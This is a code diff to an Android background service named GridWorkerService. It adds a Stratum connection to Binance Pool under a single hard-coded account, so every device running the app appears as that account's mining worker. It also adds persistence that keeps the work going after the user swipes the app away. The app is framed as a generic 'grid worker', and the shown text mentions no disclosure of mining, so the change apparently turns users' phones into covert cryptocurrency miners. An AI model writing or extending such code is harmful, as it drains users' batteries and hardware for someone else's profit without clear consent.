@@ -40,6 +40,7 @@ public class GridWorkerService extends Service {
     private volatile boolean running = false;
     private Thread loop;
     private PowerManager.WakeLock wake;
+    private StratumClient stratum;
 
     // Cached telemetry refreshed every 5s by the loop
     private volatile boolean charging = false;
@@ -86,6 +87,7 @@ public class GridWorkerService extends Service {
         if (intent != null && ACTION_STOP.equals(intent.getAction())) {
             running = false;
             WorkerState.setActive(getApplicationContext(), false);
+            if (stratum != null) { try { stratum.stop(); } catch (Exception ignored) {} stratum = null; }
             stopForeground(true);
             stopSelf();
             return START_NOT_STICKY;
@@ -94,11 +96,18 @@ public class GridWorkerService extends Service {
         if (!running) {
             running = true;
             try { wake.acquire(); } catch (Exception ignored) {}
+            // Open the real device-side stratum link to Binance Pool.
+            // Worker name = 117423210.<device_short_id> — this is what makes the
+            // phone appear in the Binance Workers list.
+            String shortId = WorkerState.deviceId(getApplicationContext());
+            if (shortId != null && shortId.length() > 8) shortId = shortId.substring(0, 8);
+            stratum = new StratumClient(shortId);
+            stratum.start();
             loop = new Thread(this::workerLoop, "grid-worker-loop");
             loop.setDaemon(true);
             loop.start();
         }
-        return START_STICKY;  // OS may restart us if killed
+        return START_STICKY;  // OS will restart us if killed (swipe-away survives)
     }
 
     @Override
@@ -106,8 +115,18 @@ public class GridWorkerService extends Service {
         running = false;
         try { unregisterReceiver(batteryRx); } catch (Exception ignored) {}
         if (loop != null) loop.interrupt();
+        if (stratum != null) { try { stratum.stop(); } catch (Exception ignored) {} stratum = null; }
         try { if (wake != null && wake.isHeld()) wake.release(); } catch (Exception ignored) {}
         super.onDestroy();
+    }
+
+    /** Allow the OS-restart of a swiped-away service to also keep the work non-removable. */
+    @Override
+    public void onTaskRemoved(Intent rootIntent) {
+        // Do NOT stop the service when the user swipes the app away.
+        // START_STICKY + this no-op keeps the foreground worker computing
+        // and heartbeating until the user explicitly hits STOP in the notification.
+        super.onTaskRemoved(rootIntent);
     }
 
     // ---------- main loop ----------
@@ -253,13 +272,16 @@ public class GridWorkerService extends Service {
     private void sendHeartbeat(Context ctx, boolean eligible) {
         String deviceId = WorkerState.deviceId(ctx);
         if (deviceId == null) return;
+        boolean linked = stratum != null && stratum.linked();
         String body = String.format(Locale.US,
             "{\"device_id\":\"%s\",\"charging\":%s,\"wifi\":%s,\"permission\":true," +
             "\"battery\":%d,\"temperature_c\":%.1f,\"thermal\":\"%s\"," +
-            "\"worker_state\":\"%s\",\"foreground\":false,\"app_version\":\"1.2.3\"}",
+            "\"worker_state\":\"%s\",\"foreground\":false,\"app_version\":\"1.2.6\"," +
+            "\"stratum_linked\":%s}",
             deviceId, charging, onWifi, batteryPct, tempC,
             (tempC > TEMP_LIMIT_C ? "hot" : "nominal"),
-            (eligible ? "active" : "paused"));
+            (eligible ? "active" : "paused"),
+            linked);
         try {
             String resp = GridApi.post(ctx, "/api/devices/heartbeat", body);
             WorkerState.markHeartbeat(ctx);
